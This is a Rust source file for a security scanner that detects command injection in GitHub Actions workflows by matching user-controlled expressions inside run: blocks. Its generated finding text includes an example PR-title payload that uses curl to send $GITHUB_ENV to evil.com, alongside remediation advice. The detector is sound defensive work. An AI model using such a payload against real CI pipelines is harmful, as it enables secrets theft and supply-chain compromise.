//! GitHub Actions Command Injection detector
//!
//! Scans workflow files for dangerous patterns where user-controlled input
//! flows into `run:` blocks. This is a CRITICAL security vulnerability.
//!
//! CWE-78: Improper Neutralization of Special Elements used in an OS Command

use crate::detectors::base::{Detector, DetectorConfig};
use crate::graph::GraphStore;
use crate::models::{Finding, Severity};
use anyhow::Result;
use regex::Regex;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;
use tracing::{debug, info};
use uuid::Uuid;

/// GitHub Actions injection detector
pub struct GHActionsInjectionDetector {
    config: DetectorConfig,
    repository_path: PathBuf,
    max_findings: usize,
}

/// Compiled regex for dangerous GitHub context patterns
static DANGEROUS_PATTERN: OnceLock<Regex> = OnceLock::new();
static RUN_BLOCK_PATTERN: OnceLock<Regex> = OnceLock::new();

fn get_dangerous_pattern() -> &'static Regex {
    DANGEROUS_PATTERN.get_or_init(|| {
        // Dangerous GitHub Actions expression patterns (user-controlled input)
        let patterns = [
            r"github\.event\.pull_request\.title",
            r"github\.event\.pull_request\.body",
            r"github\.event\.pull_request\.head\.ref",
            r"github\.event\.pull_request\.head\.label",
            r"github\.head_ref",
            r"github\.event\.issue\.title",
            r"github\.event\.issue\.body",
            r"github\.event\.comment\.body",
            r"github\.event\.review\.body",
            r"github\.event\.review_comment\.body",
            r"github\.event\.discussion\.title",
            r"github\.event\.discussion\.body",
            r"github\.event\.commits\[\d*\]\.message",
            r"github\.event\.head_commit\.message",
            r"github\.event\.head_commit\.author\.name",
            r"github\.event\.head_commit\.author\.email",
            r"github\.event\.inputs\.[^}]+",
            r"github\.event\.sender\.login",
        ];
        Regex::new(&format!(r"\$\{{\{{\s*({})\s*\}}\}}", patterns.join("|"))).unwrap()
    })
}

fn get_run_block_pattern() -> &'static Regex {
    RUN_BLOCK_PATTERN.get_or_init(|| Regex::new(r"^\s*(?:-\s+)?run:\s*[|>]?\s*").unwrap())
}

impl GHActionsInjectionDetector {
    /// Create a new GitHub Actions injection detector
    pub fn new(repository_path: impl Into<PathBuf>) -> Self {
        Self {
            config: DetectorConfig::default(),
            repository_path: repository_path.into(),
            max_findings: 50,
        }
    }

    /// Set maximum findings
    pub fn with_max_findings(mut self, max: usize) -> Self {
        self.max_findings = max;
        self
    }

    /// Scan a workflow file for dangerous patterns
    fn scan_workflow_file(&self, file_path: &Path) -> Vec<InjectionMatch> {
        let content = match std::fs::read_to_string(file_path) {
            Ok(c) => c,
            Err(e) => {
                debug!("Failed to read {:?}: {}", file_path, e);
                return Vec::new();
            }
        };

        let rel_path = file_path
            .strip_prefix(&self.repository_path)
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|_| file_path.to_string_lossy().to_string());

        let dangerous = get_dangerous_pattern();
        let run_block = get_run_block_pattern();

        let mut matches = Vec::new();
        let lines: Vec<&str> = content.lines().collect();

        let mut in_run_block = false;
        let mut run_block_indent = 0;
        let mut _run_block_start_line = 0;

        for (line_no, line) in lines.iter().enumerate() {
            let line_num = (line_no + 1) as u32;
            let stripped = line.trim_start();
            let current_indent = line.len() - stripped.len();

            // Check if this line starts a run: block
            if run_block.is_match(line) {
                in_run_block = true;
                run_block_indent = current_indent;
                _run_block_start_line = line_num;

                // Check if run: has dangerous pattern on same line
                if let Some(caps) = dangerous.captures(line) {
                    matches.push(InjectionMatch {
                        file: rel_path.clone(),
                        line: line_num,
                        content: line.trim().to_string(),
                        pattern: caps
                            .get(1)
                            .map(|m| m.as_str().to_string())
                            .unwrap_or_default(),
                    });
                }
                continue;
            }

            // Check if we're still inside the run: block
            if in_run_block {
                // Empty lines continue the block
                if stripped.is_empty() {
                    continue;
                }

                // If we dedented back to or before the run: level, we're out
                if current_indent <= run_block_indent
                    && !stripped.is_empty()
                    && !stripped.starts_with('-')
                {
                    in_run_block = false;
                    continue;
                }

                // Check for dangerous patterns inside the run block
                if let Some(caps) = dangerous.captures(line) {
                    matches.push(InjectionMatch {
                        file: rel_path.clone(),
                        line: line_num,
                        content: line.trim().to_string(),
                        pattern: caps
                            .get(1)
                            .map(|m| m.as_str().to_string())
                            .unwrap_or_default(),
                    });
                }
            }
        }

        matches
    }

    /// Create finding from injection match
    fn create_finding(&self, m: &InjectionMatch) -> Finding {
        // Categorize the type of injection
        let pattern_lower = m.pattern.to_lowercase();
        let source_type =
            if pattern_lower.contains("pull_request") || pattern_lower.contains("head_ref") {
                "Pull Request"
            } else if pattern_lower.contains("issue") {
                "Issue"
            } else if pattern_lower.contains("comment") || pattern_lower.contains("review") {
                "Comment"
            } else if pattern_lower.contains("commit") {
                "Commit"
            } else if pattern_lower.contains("inputs") {
                "Workflow Input"
            } else {
                "User Input"
            };

        let title = format!("GitHub Actions Command Injection ({})", source_type);

        let description = format!(
            r#"**Critical: Command Injection in GitHub Actions Workflow**

**File**: `{}`
**Line**: {}

**Vulnerable pattern detected**: `${{{{ {} }}}}`

**Code**:
```yaml
{}
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

**Example attack payload** (in PR title):
```
"; curl -X POST -d @$GITHUB_ENV http://evil.com; #
```

This can lead to:
- **Secrets exfiltration**: GITHUB_TOKEN, AWS keys, API tokens
- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**"#,
            m.file, m.line, m.pattern, m.content
        );

        let recommendation = format!(
            r#"**Recommended fixes**:

1. **Use an intermediate environment variable** (preferred):
   ```yaml
   - name: Safe handling
     env:
       TITLE: ${{{{ {} }}}}
     run: |
       echo "Title: $TITLE"
   ```

2. **Use GitHub Script action** (for complex logic):
   ```yaml
   - uses: actions/github-script@v7
     with:
       script: |
         const title = context.payload.pull_request.title;
         // Process safely in JavaScript
   ```

**References**:
- https://securitylab.github.com/research/github-actions-untrusted-input/
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"#,
            m.pattern
        );

        Finding {
            id: Uuid::new_v4().to_string(),
            detector: "GHActionsInjectionDetector".to_string(),
            severity: Severity::Critical,
            title,
            description,
            affected_files: vec![PathBuf::from(&m.file)],
            line_start: Some(m.line),
            line_end: Some(m.line),
            suggested_fix: Some(recommendation),
            estimated_effort: Some("Low (15-30 minutes)".to_string()),
            category: Some("command_injection".to_string()),
            cwe_id: Some("CWE-78".to_string()),
            why_it_matters: Some(
                "Command injection in CI/CD pipelines can lead to complete repository compromise, \
                 secrets theft, and supply chain attacks affecting all users of your software."
                    .to_string(),
            ),
            ..Default::default()
        }
    }
}

/// Injection match result
struct InjectionMatch {
    file: String,
    line: u32,
    content: String,
    pattern: String,
}

impl Detector for GHActionsInjectionDetector {
    fn name(&self) -> &'static str {
        "GHActionsInjectionDetector"
    }

    fn description(&self) -> &'static str {
        "Detects command injection vulnerabilities in GitHub Actions workflows"
    }

    fn detect(&self, _graph: &dyn crate::graph::GraphQuery) -> Result<Vec<Finding>> {
        let workflows_dir = self.repository_path.join(".github").join("workflows");

        if !workflows_dir.exists() {
            debug!("No .github/workflows directory found");
            return Ok(Vec::new());
        }

        info!("Scanning GitHub Actions workflows in {:?}", workflows_dir);

        let mut all_matches = Vec::new();

        // Scan all YAML files
        for entry in std::fs::read_dir(&workflows_dir)? {
            let entry = entry?;
            let path = entry.path();

            if let Some(ext) = path.extension() {
                if ext == "yml" || ext == "yaml" {
                    let matches = self.scan_workflow_file(&path);
                    all_matches.extend(matches);

                    if all_matches.len() >= self.max_findings {
                        break;
                    }
                }
            }
        }

        let findings: Vec<Finding> = all_matches
            .iter()
            .take(self.max_findings)
            .map(|m| self.create_finding(m))
            .collect();

        info!(
            "GHActionsInjectionDetector found {} potential vulnerabilities",
            findings.len()
        );

        Ok(findings)
    }

    fn category(&self) -> &'static str {
        "security"
    }

    fn config(&self) -> Option<&DetectorConfig> {
        Some(&self.config)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dangerous_pattern() {
        let pattern = get_dangerous_pattern();

        // Should match
        assert!(pattern.is_match("echo ${{ github.event.pull_request.title }}"));
        assert!(pattern.is_match("${{ github.head_ref }}"));
        assert!(pattern.is_match("${{ github.event.issue.body }}"));
        assert!(pattern.is_match("${{ github.event.comment.body }}"));

        // Should not match (safe patterns)
        assert!(!pattern.is_match("${{ github.sha }}"));
        assert!(!pattern.is_match("${{ github.repository }}"));
        assert!(!pattern.is_match("${{ secrets.GITHUB_TOKEN }}"));
    }

    #[test]
    fn test_run_block_pattern() {
        let pattern = get_run_block_pattern();

        assert!(pattern.is_match("run: echo hello"));
        assert!(pattern.is_match("  run: |"));
        assert!(pattern.is_match("    - run: >"));
        assert!(!pattern.is_match("name: Run tests"));
    }
}
